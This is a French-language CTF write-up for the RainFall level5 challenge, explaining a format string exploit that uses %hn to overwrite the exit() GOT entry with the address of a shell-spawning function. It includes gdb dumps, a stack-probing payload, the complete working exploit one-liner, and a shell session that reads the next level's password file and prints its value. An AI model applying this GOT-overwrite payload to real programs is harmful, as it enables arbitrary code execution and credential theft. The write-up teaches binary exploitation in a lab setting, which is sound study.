## Le programme

Dans le programme se trouve une fonction o() qui execute un shell mais qui n'est jamais appelé. Le main lui fait un `fgets` qui n'est pas exploitable car limité par une taille prédéfinié.


## La faille

Une première idée aurait été de passer par un simple bufferoverlow mais ce n'est pas possible à cause de `fgets`.

La prochaine idée serait de remplacer l'adresse de la fonction  exit() par l'adresse de o().

Printf peut ici nous aider à lire sur la stack avec %p parce qu'un buffer dont a la main est passé comme argument.

```
(gdb) info functions o
All functions matching regular expression "o":

Non-debugging symbols:
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x08048420  __do_global_dtors_aux
0x080484a4  o
```

adresse de o: 0x080484a4
adresse du exit(): 0x08049838

Exit est une fonction de la libc et utilise une table  GOT() qui stocke les adresses des fonctions de la libc et il est possible d'overwrite ces adresses.
L'idée est donc de remplacer l'adresse d'exit() dans la GOT par l'adresse de notre fonction malveillante o()

(gdb) info functions exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048390  _exit
0x08048390  _exit@plt

(gdb) disass 0x08048390
Dump of assembler code for function _exit@plt:
   0x08048390 <+0>:	jmp    *0x08049838
   0x08048396 <+6>:	push   $0x8
   0x0804839b <+11>:	jmp    0x8048370
End of assembler dump.
(gdb)


Maintenant on a l'adresse vers laquelle exit jump, il suffit de la remplacer par l'adresse de o()
la vraie adresse d'exit: 0x08049838

Comme les deux premiers octets (0x0804) sont identiques à l'adresse GOT on peut écrire seuelement les deux derniers

0x84a4 = 33956 en décimal

pour trouver l'emplacement de l'adresse du buffer sur la stack on peut faire :

level5@RainFall:~$ python -c 'print "AAAA" + " %p" * 8' | ./level5
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520

le buffer se trouve donc au 4éme argument

[adresse GOT][padding][%4$hn]

caractères imprimés = 4 (adresse GOT) + 33952 (padding) = 33956

%n écrit le nombre total de caractères imprimés et on rajoute le h à %n (%hn) pour réécrire les deux derniers octets de l'adresse


## La solution
(python -c 'print "\x08\x04\x98\x38"[::-1] + "%33952c%4$hn"'; cat) | ./level5

La commande met l’adresse de `exit@GOT` au début du buffer en little-endian (car le système est 32 bits) et ajoute un padding pour que le nombre total de caractères imprimés atteigne la valeur des 2 derniers octets de l’adresse de `o()`. Ensuite, `%4$hn` écrit ce nombre dans l’adresse fournie (le 4ᵉ argument du printf, notre buffer), **modifiant seulement les 2 derniers octets** pour que `exit()` pointe vers `o()`.


whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
